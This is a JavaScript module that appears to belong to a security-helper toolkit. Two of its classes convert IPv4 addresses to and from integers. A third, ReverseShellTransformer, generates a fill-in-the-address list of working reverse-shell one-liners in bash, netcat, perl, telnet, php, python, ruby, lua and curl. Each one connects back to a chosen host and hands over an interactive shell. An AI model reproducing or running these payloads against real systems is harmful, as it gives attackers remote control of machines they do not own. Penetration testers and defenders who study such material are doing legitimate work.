'use strict';

const Transformer = require('../core');

class IPv4ToNumberTransformer extends Transformer {
    get command () {
        return 'IPv4ToNumber';
    }
    get label() {
        return "IPv4 to Number";
    }
    /**
     * @param {string} input
     * @returns {boolean}
     */
    check(input) {
        var re = /^(?:(?:\d|[01]?\d\d|2[0-4]\d|25[0-5])\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d|\d)$/;
        if (re.test(input)) {
            return true;
        }
        return false;
    }
    /**
     * @param {string} input
     * @returns {string}
     */
    transform(input) {
        var TmpList = input.split(".");
        let output = 256 * 256 * 256 * Number(TmpList[0]) + 256 * 256 * Number(TmpList[1]) + 256 * Number(TmpList[2]) + Number(TmpList[3]);
        return String(output);
    }
}

class NumberToIPv4Transformer extends Transformer {
    get command () {
        return 'NumberToIPv4';
    }
    get label() {
        return "Number to IPv4"
    }
    /**
     * @param {string} input
     * @returns {boolean}
     */
    check(input) {
        if (parseInt(input) > 0 && parseInt(input) <= 4294967295) {
            return true;
        }
        return false;
    }
    /**
     * @param {string} input
     * @returns {string}
     */
    transform(input) {
        let e = parseInt(input);
        let o = [
            e >>> 24 >>> 0,
            e << 8 >>> 24 >>> 0,
            e << 16 >>> 24,
            e << 24 >>> 24,
        ];
		return o.join('.');
	}
}

class ReverseShellTransformer extends Transformer {
    get command () {
        return 'ReverseShell';
    }
    get label() {
        return "IP[:Port] to Reverse Shell";
    }
    /**
     * @param {string} input
     * @returns {boolean}
     */
    check(input) {
        // Basic check for IP:PORT format
        var re = /^(?:(?:\d|[01]?\d\d|2[0-4]\d|25[0-5])\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d|\d)(?:\:(?:\d{1,4}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-3]\d|6553[0-5]))?$/
        if (!re.test(input)) {
            return false;
        }
        return true;
    }
    /**
     * @param {string} input
     * @returns {string}
     */
    transform(input) {
        let [ip, port] = input.split(':');
        if (!port) {
            port = '1337';
        }
        const reverseShell = `bash:
    /bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1
nc:
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f
perl:
    perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
telnet:
    rm -f /tmp/p; mknod /tmp/p p && telnet ${ip} ${port} 0/tmp/p
sh:
    /bin/sh -i >& /dev/tcp/${ip}/${port} 0>&1
php:
    php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'
python:
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
ruby:
    ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
lua:
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
curl:
    C='curl -Ns telnet://${ip}:${port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
`;
        return reverseShell;
    }
}

module.exports = {
    IPv4ToNumberTransformer,
    NumberToIPv4Transformer,
    ReverseShellTransformer,
}